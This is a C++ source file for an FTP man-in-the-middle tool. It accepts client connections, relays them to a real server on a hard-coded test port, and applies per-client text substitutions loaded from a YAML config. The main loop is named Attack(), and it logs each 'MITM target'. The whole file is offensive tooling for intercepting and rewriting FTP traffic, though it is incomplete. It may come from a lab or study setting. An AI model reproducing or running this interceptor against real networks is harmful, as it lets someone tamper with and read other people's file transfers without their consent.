#include <ftp_mitm.hpp>
#include <yaml-cpp/yaml.h>
#include <filesystem>
#include <iostream>
#include <arpa/inet.h>

void FtpMitm::LoadConfig(const std::string& config_path) {
    try {
        YAML::Node config = YAML::LoadFile(config_path);
        this->_port = config["config"]["port"].as<int>();
        this->_buffer_size = config["config"]["buffer_size"].as<unsigned int>();
        for (auto&& task_config : config["tasks"]) {
                std::string server = task_config["server"].as<std::string>();
                std::string client = task_config["client"].as<std::string>();
                Task task(client, server);
                for (auto&& sub : task_config["substitutions"]) {
                    std::string target = sub["target"].as<std::string>();
                    std::string _sub  = sub["sub"].as<std::string>();
                    task.AddSubstitution({target, _sub});
                }
                this->_tasks.push_back(task);
        }
    } catch (const YAML::Exception& ex) {
            std::cout << ex.what() << std::endl;
    }
}

int FtpMitm::StartServer() {
    sockaddr_in serverAddr;
    this->_socket = socket(AF_INET, SOCK_STREAM, 0);
    if (this->_socket < 0) {
        std::cout << "Can not create socket!" << std::endl;
        return -1;
    }
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = INADDR_ANY;
    serverAddr.sin_port = htons(this->_port);

    if (bind(this->_socket, (sockaddr*)&serverAddr, sizeof serverAddr)) {
        std::cout << "Can not bind socket!" << std::endl;
        return -2;
    }

    if (listen(this->_socket, 5) < 0) {
        std::cout << "Can not listen socket!" << std::endl;        
    }
    std::cout << "Server started!" << std::endl;
    return 0;
}

void FtpMitm::Attack() {
    int clientSocket;
    sockaddr_in clientAddr;
    socklen_t clientAddrLen = sizeof clientAddr;
    while (true) {
        clientSocket = accept(this->_socket, (sockaddr*)&clientAddr, &clientAddrLen);
        if (clientSocket < 0) {
            continue;
        }
        std::cout << "Client connected!" << std::endl;
        // add std::thread later
        this->holdClient(clientSocket, clientAddr);
    }
}



void FtpMitm::translateSession(int clientSocket, Task task) {
    int serverSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (serverSocket < 0) {
        std::cout << "Can not open socket for server!" << std::endl;
        return;
    }
    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(2122); // test port (change later)
    if (inet_pton(AF_INET, task.GetServer().c_str(), &serverAddr.sin_addr) <= 0) {
        std::cout << "Could not find server: " << task.GetServer() << std::endl;
        return;
    }
    if (connect(serverSocket, (sockaddr*)&serverAddr, sizeof serverAddr)) {
        std::cout << "Could not connect to server!" << std::endl;
        return;
    }
    std::cout << "Connected to server, message translation started..." << std::endl;
    Session session;
    session.client = clientSocket;
    session.server = serverSocket;
    session.semaphore = 1;
    session.task = task;
    session.buffer_size = this->_buffer_size;
    while (session.TranslateMessages());
    close(serverSocket);
    close(clientSocket);
}

void FtpMitm::holdClient(int clientSocket, sockaddr_in clientAddr) {
    char address[INET_ADDRSTRLEN] = {};
    inet_ntop(AF_INET, &clientAddr.sin_addr, address, INET_ADDRSTRLEN);
    std::string client_addr = address;
    std::cout << "Client address: " << client_addr << std::endl;
    Task task;  // default task doesn't have any subs
    for (int i = 0; i < this->_tasks.size(); ++i)
        if (this->_tasks[i].GetClient() == client_addr) {
            task = this->_tasks[i];
            break;
        }
    std::cout << "MITM target for current client: " << task.GetServer() << std::endl;
    this->translateSession(clientSocket, task);
}

FtpMitm::~FtpMitm() {
    close(this->_socket);
}